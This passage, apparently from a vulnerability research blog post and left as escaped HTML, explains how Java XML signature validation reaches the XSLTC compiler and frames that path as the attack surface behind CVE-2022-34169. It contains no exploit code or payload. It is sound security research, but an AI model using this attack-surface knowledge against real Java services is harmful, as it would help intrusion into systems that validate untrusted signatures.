normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;==&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;null&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;throw&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;new&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;NullPointerException&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"validateContext cannot be null\"&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;if&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;validated&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;return&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; validationStatus&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Data&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; data &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; dereference&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;validateContext&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;D&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;calcDigestValue &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; transform&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;data&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;,&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; validateContext&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;E&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[..]&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;validationStatus &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Arrays&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;equals&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;digestValue&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;,&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; calcDigestValue&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;F&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;validated &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;true&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;return&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; validationStatus&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The code gets the referenced data in (D), transforms it in (E) and compares the digest of the result with the digest stored in the signature in (F). Most of the complexity is hidden behind the call to &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;transform&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; in (E) which loops through all Transform elements defined in the Reference and executes them.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;As this is Java, we have to walk through a lot of indirection layers before we end up at the interesting parts. Take a look at the call stack below if you want to follow along and step through the code:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Courier New, sans-serif; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:584) at com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl.newTransformer(TransformerFactoryImpl.java:818) at com.sun.org.apache.xml.internal.security.transforms.implementations.TransformXSLT.enginePerformTransform(TransformXSLT.java:130) at com.sun.org.apache.xml.internal.security.transforms.Transform.performTransform(Transform.java:316) at org.jcp.xml.dsig.internal.dom.ApacheTransform.transformIt(ApacheTransform.java:188) at org.jcp.xml.dsig.internal.dom.ApacheTransform.transform(ApacheTransform.java:124) at org.jcp.xml.dsig.internal.dom.DOMTransform.transform(DOMTransform.java:173) at org.jcp.xml.dsig.internal.dom.DOMReference.transform(DOMReference.java:457) at org.jcp.xml.dsig.internal.dom.DOMReference.validate(DOMReference.java:387) at org.jcp.xml.dsig.internal.dom.DOMXMLSignature.validate(DOMXMLSignature.java:281)&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;If we specify a XSLT transform and the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;org.jcp.xml.dsig.secureValidation&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; property isn't enabled (we’ll come back to this later) we will end up in the file &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/trax/TransformerFactoryImpl.java&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; which is part of a module called XSLTC.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;XSLTC, the XSLT compiler, is originally part of the &lt;/span&gt;&lt;a href=\"https://xalan.apache.org/\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;Apache Xalan&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; project. OpenJDK forked Xalan-J, a Java based XSLT runtime, to provide XSLT support as part of Java’s standard library. While the original Apache project has a number of features that are not supported in the OpenJDK fork, most of the core code is identical and CVE-2022-34169 affected both codebases.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;XSLTC is responsible for compiling XSLT stylesheets into Java classes to improve performance compared to a naive interpretation based approach. While this has advantages when repeatedly running the same stylesheet over large amounts of data, it is a somewhat surprising choice in the context of XML signature validation. Thinking about this from an attacker's perspective, we can now provide arbitrary inputs to a fully-featured JIT compiler. Talk about an unexpected attack surface!&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;A bug in XSLTC&lt;/span&gt;&lt;/h2&gt;&lt;div align=\"left\" dir=\"ltr\" style=\"margin-left: 0pt;\"&gt;&lt;table style=\"border-collapse: collapse; border: none;\"&gt;&lt;colgroup&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;td style=\"background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &amp;nbsp; &amp;nbsp; /**&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;* As Gregor Samsa awoke one morning from uneasy dreams he found himself&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;* transformed in his bed into a gigantic insect. He was lying on his hard,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;* as it were armour plated, back, and if he lifted his head a little 